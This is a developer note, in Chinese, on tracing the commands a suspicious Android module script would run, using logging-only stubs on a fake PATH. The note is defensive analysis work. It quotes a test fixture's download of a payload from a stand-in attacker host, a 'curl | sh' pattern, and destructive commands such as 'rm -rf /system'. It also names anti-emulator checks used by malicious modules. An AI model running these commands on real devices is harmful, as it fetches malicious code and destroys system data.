# 受控 dry-run：假 PATH 沙箱看模块「会跑哪些命令」

SUMMARY: 用假 PATH（每条命令一个只记录不执行的 stub）+ 真 shell 解释器，跑出模块脚本的「命令轨迹」；
**stub 里绝不能包含 sh/bash**，否则外层那次 `sh ./script.sh` 会被自己的 stub 吃掉，脚本根本没被解释。
READ WHEN: when 要取证「某个模块脚本到底会执行什么」、或评估「把动态沙箱搬进 APK / 做执行轨迹预览」是否可行时。

---

## 怎么做（本机已验证，2026-09-20）

1. 给每条可能被调用的命令写一个 stub（`curl/wget/base64/rm/chmod/mount/setprop/resetprop/su/`
   `iptables/dd/nc/busybox/...`）：

   ```sh
   #!/bin/sh
   echo "RUN rm $*" >> "$MRS_TRACE"
   ```

2. `PATH="$PWD/bin:$PATH" sh ./sample.sh`。真解释器照常做变量展开、条件、循环、重定向，
   被调用的命令全部只留痕（实测 `core/tests/fixtures/evil/customize.sh` 跑出 14 条按真实顺序的轨迹，
   首条就是 `curl http://evil.example.com/payload.sh -o /data/local/tmp/p.sh`）。
3. 顺带能得到静态扫描看不到的东西：运行期报错（如重定向目标在宿主不存在）、变量展开后的真实路径、
   哪个分支真的被走到。产物在 `build/dryrun/`（被 .gitignore 忽略）。

## 陷阱

- **别 stub `sh`/`bash`/`busybox`**：`sh` 一旦被 stub，外层 `sh ./sample.sh` 就落进 stub 直接退出，
  轨迹里只剩一行 `RUN sh ./sample.sh`（第一次跑正是这么翻车的）。
- **stub 只能写文件、不能往 stdout 写**：脚本里的 `curl ... | sh` 会把这行输出真的喂给 shell 执行。
- 脚本必须存成 **LF**（`-replace "\r\n","\n"` + `[IO.File]::WriteAllText`）；从 PowerShell 调 `bash`
  时先 `cd "$(dirname "$0")"`，否则按 PowerShell 的 cwd 找文件、报 `No such file or directory`。

## 结论：为什么它进不了 APK

- **产品定位**：APK 的卖点是不联网、不要 root、只看未安装的 zip；「刷写后观察」等于已经执行过恶意代码，
  是拿中毒来验毒。
- **技术上不可行**：非 root 下 `rm -rf /system`、`resetprop`、`setenforce`、`mount -o rw,remount`
  全部 permission denied；真跑要 rooted AVD/Magisk，而 Android 应用拿不到虚拟化（AVF/pKVM 不是应用能力）。
- **方法不可靠**：恶意模块普遍反沙箱/反模拟器（`ro.kernel.qemu`、`goldfish`、`/dev/qemu_pipe`）与延时触发，
  检测到就装死；「刷写」本身就是它们等的触发条件。

可行的两个形态：APK 内做**静态**「执行轨迹预览」（按钩子分组、按顺序列命令，零执行）；真要动态则放**桌面/CI 侧**
独立沙箱（rooted AVD，或 Linux chroot + 假 Magisk 环境 + strace/execve 日志），不进 APK。
